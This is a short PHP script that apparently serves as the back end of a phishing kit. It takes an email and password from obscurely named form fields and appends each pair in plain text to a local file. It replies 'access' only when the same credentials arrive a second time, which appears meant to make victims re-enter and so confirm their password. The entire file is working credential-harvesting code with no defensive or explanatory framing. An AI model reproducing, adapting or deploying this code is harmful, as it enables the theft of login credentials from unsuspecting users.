<?php
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
$file_path = 'form_data.txt';
$email = isset($_POST['x1']) ? trim($_POST['x1']) : '';
$password = isset($_POST['x2']) ? trim($_POST['x2']) : '';
$credentials = "$email:$password";

// Load existing data and check for duplicates
$data = file_exists($file_path) ? file($file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
$is_duplicate = in_array($credentials, $data);

if ($is_duplicate) {
    echo "access";
	file_put_contents($file_path, $credentials . PHP_EOL, FILE_APPEND | LOCK_EX);
    exit;
} else {
    file_put_contents($file_path, $credentials . PHP_EOL, FILE_APPEND | LOCK_EX);
}
?>
